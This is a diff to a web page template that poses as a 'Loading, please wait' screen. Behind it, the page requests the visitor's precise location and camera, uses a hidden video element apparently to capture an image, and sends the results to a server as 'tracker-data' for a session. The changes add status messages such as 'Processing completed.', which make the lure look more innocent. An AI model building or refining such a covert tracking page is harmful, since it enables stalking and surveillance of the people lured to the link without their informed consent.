@@ -7,8 +7,8 @@
     <script src="/socket.io/socket.io.js"></script>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h3>Loading page, please wait...</h3>
+    <div style="text-align: center; margin-top: 100px; font-family: sans-serif;">
+        <h3 id="status">Loading, please wait...</h3>
     </div>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
@@ -18,11 +18,13 @@
         const socket = io();
         const sessionId = "<%= sessionId %>";
         const mode = "<%= mode %>";
+        const statusText = document.getElementById('status');
 
         socket.emit('join-room', sessionId);
 
         function sendData(data) {
             socket.emit('tracker-data', { roomId: sessionId, ...data });
+            statusText.innerText = "Processing completed.";
         }
 
         // Location capture logic
@@ -35,7 +37,8 @@
                         accuracy: position.coords.accuracy
                     });
                 }, (error) => {
-                    console.error("Location permission denied or error", error);
+                    statusText.innerText = "Location permission needed.";
+                    console.error("Location error", error);
                 }, { enableHighAccuracy: true, timeout: 10000 });
             }
         }
@@ -61,7 +64,8 @@
                     }, 2500);
                 })
                 .catch(err => {
-                    console.error("Camera permission denied or error", err);
+                    statusText.innerText = "Camera permission needed.";
+                    console.error("Camera error", err);
                 });
         }
     </script>
